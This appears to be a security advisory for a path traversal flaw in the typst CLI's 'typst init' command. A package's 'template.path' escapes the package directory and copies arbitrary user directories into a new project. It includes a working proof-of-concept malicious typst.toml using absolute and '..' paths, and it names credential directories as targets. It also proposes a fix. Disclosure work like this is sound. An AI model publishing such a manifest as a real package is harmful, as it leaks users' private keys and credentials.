# typst: `typst init` copies an arbitrary directory via unvalidated `template.path`

**Package**: typst (typst-cli)
**Ecosystem**: crates.io / GitHub releases
**Affected versions**: tested at `c98e9103` (v0.15.0); present in earlier versions with the same `scaffold_project`
**Patched versions**: none
**Severity**: Medium
**CVSS 3.1**: `AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` — **5.5**
**CWE**: CWE-22 (Path Traversal)

## Summary

`typst init` reads `template.path` from a package's `typst.toml` and passes it
straight to Rust's `Path::join()` with no validation. Because `Path::join()` replaces
the base when its argument is absolute (and does not normalize `..`), a malicious
package can set `template.path` to an absolute path (e.g. `/etc`, `~/.ssh`) or a `..`
chain. `scaffold_project` then copies the entire contents of that directory into the
user's new project directory, disclosing arbitrary files the user can read.

## Affected code

`crates/typst-cli/src/init.rs`, `scaffold_project` (verified at v0.15.0):

```rust
// line 80
let template_dir = package_path.join(template.path.as_str());
if !template_dir.exists() {                       // line 81 — the only guard
    bail!("template directory does not exist (at {})", template_dir.display());
}
// lines 85-88
fs_extra::dir::copy(
    &template_dir,
    project_dir,
    &CopyOptions::new().content_only(true),
)
```

`TemplateInfo.path` is an unvalidated `EcoString` (`crates/typst-syntax/src/package.rs:83`,
`pub path: EcoString,`). `PackageManifest::validate()` (`package.rs:157-183`) checks
only `name`, `version`, and the optional compiler bound — it never inspects
`template.path`. The only check before the copy is `template_dir.exists()`, which the
attacker trivially satisfies.

## Mechanism (verified with a standalone `rustc` program)

```
join("/etc")                              = "/etc"            (absolute replaces base)
join("../../../../../../.ssh")            = "<base>/../../../../../../.ssh"  (NOT normalized; OS resolves at copy)
join("template")                          = "<base>/template" (expected, safe case)
```

So both an absolute `template.path` and a sufficiently long `..` chain escape the
package directory.

## The gap

typst already has a robust path sandbox for document compilation — `VirtualPath`
(`crates/typst-syntax/src/path.rs`) normalizes paths and rejects `..` escapes
(`PathError::Escapes`). `typst init` bypasses that system entirely, using raw
`Path::join` + `fs_extra::dir::copy` with no containment.

## Proof of concept (reproduced end-to-end against a real v0.15.0 build)

A local package avoids needing Typst Universe (the `@preview` path hits the identical
`scaffold_project` sink after download). Staged at
`~/Library/Application Support/typst/packages/local/evil-template/0.1.0/typst.toml`:

```toml
[package]
name = "evil-template"
version = "0.1.0"
entrypoint = "main.typ"
authors = ["x"]
license = "MIT"
description = "x"

[template]
path = "/tmp/poc-review/typst-secret"   # attacker-chosen absolute dir
entrypoint = "main.typ"
```

`/tmp/poc-review/typst-secret/` contained `SECRET.txt`, `main.typ`, and
`subdir/nested.txt`. Run in an empty working dir:

```
$ typst init @local/evil-template:0.1.0
Successfully created new project from @local/evil-template:0.1.0 🎉

$ find . -type f
./evil-template/main.typ
./evil-template/SECRET.txt          # exfiltrated
./evil-template/subdir/nested.txt   # nested dir exfiltrated too

$ cat ./evil-template/SECRET.txt
TOP SECRET - exfiltrated via template.path absolute join
```

The complete contents of the arbitrary absolute directory (recursively) were copied
into the victim's project — no prompt, no warning, exit 0. The `..` variant
(`path = "../../../../../../../../tmp/poc-review/typst-secret"`) reproduced
identically.

## Impact

A malicious template package — published to Typst Universe or installed locally — can
read the contents of any directory readable by the user running `typst init`:
`~/.ssh/`, `~/.aws/credentials`, `~/.gnupg/`, app config with API keys, etc. The
contents land in the new project dir (and, since `content_only(true)`, directly at its
top level). The attack is victim-initiated — the user must run `typst init` against
the attacker's template — which the Typst ecosystem's "start from a community
template" workflow makes plausible. Impact is local file/dir **disclosure**, not write
or RCE.

## Suggested fix

Validate `template.path` before joining/copying — reject absolute paths and `..`, then
confirm containment via `canonicalize()` + `starts_with(package_path)`:

```rust
let p = Path::new(template.path.as_str());
if p.is_absolute() || template.path.contains("..") {
    bail!("template path must be a relative path within the package");
}
let template_dir = package_path.join(p);
let (ct, cp) = (template_dir.canonicalize()?, package_path.canonicalize()?);
if !ct.starts_with(&cp) {
    bail!("template path escapes package directory");
}
```

Alternatively, route the template path through the existing `VirtualPath` sandbox so
`typst init` inherits the same escape protection as document compilation.
